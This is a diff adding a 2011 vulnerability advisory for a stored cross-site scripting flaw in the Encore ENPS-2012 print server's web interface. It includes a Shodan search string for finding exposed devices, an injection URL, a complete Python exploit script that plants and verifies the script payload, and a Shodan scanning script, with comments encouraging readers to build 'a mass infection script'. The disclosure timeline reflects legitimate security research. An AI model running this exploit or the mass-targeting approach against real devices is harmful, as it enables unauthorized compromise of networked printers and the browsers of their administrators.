@@ -1,0 +1,246 @@
+GotGeek Labs
+http://www.gotgeek.com.br/
+
+Encore ENPS-2012 Cross-site Scripting Vulnerability
+
+
+
+[+] Description
+
+Encore 3-Port Print Server converts a standalone USB or a parallel printer into
+a shared printer, through a wired Ethernet connection. As a result, you can save
+the cost and space for additional printers. ENPS-2012 can connect up to 3
+printers - using the 2 USB2.0 ports and 1 parallel port - that users can share
+across the Internet or local area network (LAN). Printing on the shared printers
+from anywhere on the Internet is as easy as printing from your own office.
+For your convenience, ENPS-2012 comes with a friendly WEB-based configuration interface.
+This device also supports multiple network protocols and operating systems, making
+shared printing in mixed-LAN environments easy.
+
+
+
+[+] Information
+
+Title: Encore ENPS-2012 Cross-site Scripting Vulnerability
+Shodan Dork: ZOT-PS-39/6.3.0008 -WWW-Authenticate
+Advisory: gg-005-2011
+Date: 03-15-2011
+Last update: 03-26-2011
+Link: http://www.gotgeek.com.br/pocs/gg-005-2011.txt
+
+
+
+[+] Vulnerabilities
+
+Stored Cross-site Scripting:
+Web interface from ENPS-2012 Print Server is affected by stored cross-site scripting
+vulnerability because it fails to properly sanitize user-supplied input at
+"NDSContext" field in "NetWare NDS Settings" area.
+An attacker may leverage this issue to execute arbitrary script code
+in the browser of an unsuspecting user in the context of the affected site.
+
+After injecting the XSS code, you need to access Netware status page.
+
+XSS:
+http://target/RESTART.HTM?NDSContext=</script><script>alert("xss")</script><script>
+
+and then..
+
+http://target/NETWARE.HTM
+
+
+Affected Version:
+
+Encore ENPS-2012 Print Server
+Firmware: 6.03.39E 0008 (ZOT-PS-39/6.3.0008) 
+
+Other versions may also be vulnerable.
+
+
+
+[+] Proof of Concept/Exploit
+
+##
+#
+# Exploit created for Encore ENPS-2012
+# It can be easily modified to test other devices..
+# or you can create a mass infection script using your shodan skills :)
+#
+##
+
+
+# $ python enps-2012.py -t 10.1.1.245 -o 0 -s GOTGEEK
+#
+# [*] gotgeek labs
+# [*] http://gotgeek.com.br
+#
+# [*] XSS Options:
+# [*] 0 = alert('xss')
+# [*] 1 = window.location='http://www.example.com/'
+#
+#
+# [*] Checking print-server...
+# [+] Seems to be print-server ENPS-2012
+# [+] Injecting XSS code...
+# [*] Wait while the print-server restarts
+# [*] Checking XSS code...
+# [+] XSS Injected!
+#
+# [*] Done!
+
+
+
+#!/usr/bin/python
+#
+
+import sys, time
+import httplib, socket
+import urllib, re
+from optparse import OptionParser
+
+url = "/RESTART.HTM?PSName="
+url2 = "&NDSContext="
+
+usage = "./%prog -t <target> -o <xss number> -s <true str>\n"
+usage+= "Example: ./%prog -t 10.1.1.1 -o 0 -s GOTGEEK"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-t", action="store", dest="target",
+                  help="target print-server")
+parser.add_option("-o", action="store", dest="xss",
+                  help="xss option")
+parser.add_option("-s", action="store", dest="truestr",
+                  help="true string to validate")
+(options, args) = parser.parse_args()
+
+def banner():
+    print "\n[*] gotgeek labs"
+    print "[*] http://gotgeek.com.br\n"
+    print "[*] XSS Options:"
+    print "[*] 0 = alert('xss')"
+    print "[*] 1 = window.location='http://www.example.com/'\n\n"
+
+if len(sys.argv) < 4:
+    banner()
+    parser.print_help()
+    sys.exit(1)
+
+
+def setxss():
+    xss = [ '</script><script>alert("xss")</script><script>',
+            '</script><script>window.location="http://www.example.com/"</script><script>' ]
+    options.xss = xss[int(options.xss)]
+    return options.xss
+
+
+def checkurl():
+    try:
+        print "[*] Checking print-server..."
+        conn = httplib.HTTPConnection(options.target)
+        conn.request("GET", "/CNETWARE.HTM")
+        r1 = conn.getresponse()
+        if r1.status == 200:
+            print "[+] Seems to be print-server ENPS-2012"
+        else:
+            print "[-] None Found!\n\n"
+            sys.exit(1)
+    except socket.error, msg:
+        print "[-] Can't connect to the target!\n\n"
+        sys.exit(1)
+
+
+def injxss():
+    try:
+        print "[+] Injecting XSS code..."
+        urllib.urlopen("http://"+options.target+url+options.truestr+url2+options.xss)
+    except:
+        print "[-] Can't connect to the target!\n\n"
+        sys.exit(1)
+
+
+def checkxss():
+    print "[*] Wait while the print-server restarts"
+    time.sleep(20)
+    try:
+        print "[*] Checking XSS code..."
+        check = urllib.urlopen("http://"+options.target+"/NETWARE.HTM").read()
+        if re.search(options.truestr,check):
+            print "[+] XSS Injected!\n"
+        else:
+            print "[-] XSS NOT Injected!\n"
+            sys.exit(1)
+    except:
+        print "[-] Can't connect to the target!\n\n"
+        sys.exit(1)
+
+
+
+def main():
+    banner()
+    setxss()
+    checkurl()
+    injxss()
+    checkxss()
+    print "[*] Done!\n\n"
+
+if __name__ == "__main__":
+    main()
+
+
+#
+##
+#
+
+# Looking for vulnerable devices using Shodan
+# Encore, TP-Link and etc.
+#
+
+# $ python shodan_zot_ps.py 'ZOT-PS -WWW-Authenticate'
+#
+# [+] Results found: 2006
+#
+# xxx.xx.xx.xxx
+# xxx.xx.xx.xxx
+# xxx.xx.xx.xxx
+# ...
+
+
+
+#!/usr/bin/python
+#
+
+import sys
+from shodan import WebAPI
+
+SHODAN_API_KEY = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+api = WebAPI(SHODAN_API_KEY)
+
+try:
+    results = api.search(sys.argv[1])
+    print "\n[+] Results found: %s\n" % results['total']
+    for result in results['matches']:
+        print result['ip']
+    print ""
+except Exception, e:
+    print "Error: %s" % e
+
+
+
+[+] Timeline
+
+16-03-2011: first contact to vendor.
+24-03-2011: second contact to vendor.
+03-04-2011: no vendor response.
+04-04-2011: advisory published.
+
+
+
+[+] References
+
+http://www.encore-usa.com/us/product/ENPS-2012
+
+
+
+[+] Credits
+
+b0telh0
